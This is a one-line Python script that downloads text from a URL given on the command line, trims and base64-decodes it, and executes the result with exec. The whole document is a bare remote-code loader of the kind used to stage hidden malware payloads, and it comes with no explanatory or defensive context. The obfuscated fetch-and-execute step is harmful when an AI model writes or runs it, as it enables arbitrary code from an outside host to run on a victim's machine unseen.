from base64 import b64decode;from requests import get;import sys;exec(b64decode(get(sys.argv[1]).text[2:-2]))
